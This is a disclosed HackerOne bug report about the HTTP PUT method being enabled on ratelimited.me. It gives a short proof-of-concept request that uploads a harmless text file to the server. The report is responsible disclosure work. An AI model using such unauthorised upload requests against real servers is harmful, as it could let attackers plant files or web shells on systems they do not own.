# HTTP PUT method enabled

## Report Details
- **Report ID**: 369581
- **URL**: https://hackerone.com/reports/369581
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-06-21T15:57:50.449Z
- **Disclosed**: 2018-12-11T15:55:47.812Z

## Reporter
- **Username**: emitrani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ratelimited

## Vulnerability Information
Hi security team,

**Summary:** It is possible to upload files to the server using the PUT method

## Steps To Reproduce:

1. I used the following request:

```
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10
Connection: close

emitrani POC
```
Now a file exists at https://ratelimited.me/emitrani.txt
with contents of the put request.

## Impact

Anyone can upload files to the server.

Regards,
Eray

## Attachments
No attachments
